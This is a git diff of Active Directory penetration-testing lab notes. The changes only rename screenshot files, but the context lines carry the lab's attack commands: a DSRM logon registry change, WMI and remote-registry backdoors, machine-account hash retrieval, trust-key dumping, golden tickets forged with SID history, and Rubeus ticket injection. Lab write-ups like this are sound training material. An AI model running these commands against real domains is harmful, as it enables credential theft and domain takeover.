@@ -622,7 +622,7 @@ The DSRM administrator is not allowed to logon to the DC from network. So we nee
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025115059.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025115059 (1).png" alt=""><figcaption></figcaption></figure>
 
 Now from the attack box we can simply pas the hash and use the dsrm administrator session
 
@@ -703,7 +703,7 @@ And modify the service
 Set-RemoteWMI -SamAccountName student115 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025144401.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025144401 (1).png" alt=""><figcaption></figcaption></figure>
 
 ow we granted the acces to us
 
@@ -711,7 +711,7 @@ ow we granted the acces to us
 gwmi -class win32_operatingsystem -ComputerName dcorp-dc
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025144606.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025144606 (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -731,7 +731,7 @@ To check if the command worked
 Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025145545.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025145545 (1).png" alt=""><figcaption></figcaption></figure>
 
 _Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI_ To retrieve access without Domain admin access we need to modify a permission on the dc So open a session, import race.ps1 and launche te command.
 
@@ -743,7 +743,7 @@ _Retrieve machine account hash from dcorp-dc without using administrator access 
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025150802.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025150802 (1).png" alt=""><figcaption></figcaption></figure>
 
 and retrieve the hash
 
@@ -755,7 +755,7 @@ and retrieve the hash
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231025150902.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231025150902 (1).png" alt=""><figcaption></figcaption></figure>
 
 and with that we can create a silver ticket for the services (in this case HOST)
 
@@ -1045,7 +1045,7 @@ All this process to dump the key could be done with invoke-mimi (obs with the ti
 Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231113153820.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231113153820 (1).png" alt=""><figcaption></figcaption></figure>
 
 `Trust key - dcorp-dc -> mcorp-dc`
 
@@ -1067,7 +1067,7 @@ Now you can frge a ticket with SID History of Enterprise Admins.Use BetterSafeyK
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:988f695ef97fb2f8523346c70795d802 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231113155053.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231113155053 (1).png" alt=""><figcaption></figcaption></figure>
 
 Now use rubeus to use the ticket and get access on mcorp-dc
 
@@ -1075,7 +1075,7 @@ Now use rubeus to use the ticket and get access on mcorp-dc
 C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231113155312.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231113155312 (1).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;Test it
 
@@ -1091,7 +1091,7 @@ With the hash of krbtgt account from dcorp-dc we can create an inter-realm TGT a
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/Pasted image 20231113161101.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Pasted image 20231113161101 (1).png" alt=""><figcaption></figcaption></figure>
 
 Test it
 
